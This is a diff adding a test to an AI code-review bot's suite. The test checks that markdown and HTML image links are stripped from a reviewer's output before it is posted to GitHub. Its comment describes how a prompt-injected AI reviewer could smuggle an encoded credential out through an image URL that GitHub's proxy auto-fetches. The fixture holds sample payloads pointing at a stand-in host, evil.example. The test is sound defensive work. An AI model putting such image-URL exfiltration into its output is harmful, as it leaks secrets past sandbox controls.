@@ -439,6 +439,39 @@ def test_mark_review_failed_captures_failure_event(team, raw_error, expected_sto
 
 
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
+def test_reviewer_markdown_images_are_neutralized_before_posting(team, stamphog_chain: StamphogChain) -> None:
+    # A prompt-injected reviewer could smuggle an encoded credential into a markdown image URL, and
+    # GitHub auto-fetches images through its camo proxy on render — exfiltration around the sandbox
+    # egress fence. Images must not survive to the posted body; the surrounding prose must.
+    repo_config = _repo_config(team.id)
+    recorder = stamphog_chain.recorder
+    head_sha = "sha114a"
+    recorder.register_pr(REPO, 114, _pr_object(114, "devex-dev", head_sha), _pr_files())
+    engine_payload = json.loads(fakes.approved_engine_output().splitlines()[-1])
+    engine_payload["review_body"] = (
+        'Looks fine. ![exfil](https://evil.example/aGVsbG8=) and <img src="https://evil.example/x"> end.'
+    )
+    pull_request = PullRequest.objects.for_team(team.id).create(
+        team_id=team.id, repo_config=repo_config, pr_number=114, author_login="devex-dev"
+    )
+    run = ReviewRun.objects.for_team(team.id).create(
+        team_id=team.id,
+        pull_request=pull_request,
+        head_sha=head_sha,
+        status=ReviewRunStatus.REVIEWING,
+        output={"reviewer_raw": json.dumps(engine_payload)},
+    )
+
+    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))
+
+    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
+    body = approvals[0]["body"]["body"]
+    assert "evil.example" not in body
+    assert body.count("[image removed]") == 2
+    assert body.startswith("Looks fine.") and body.endswith("end.")
+
+
+@pytest.mark.django_db(databases=PRODUCT_DATABASES)
 def test_mark_review_failed_never_rewrites_a_terminal_run(team) -> None:
     # post_verdict saves COMPLETED (approval already posted to GitHub) before its trailing digest
     # stamp; a failure in that tail must not rewrite the delivered outcome to FAILED.
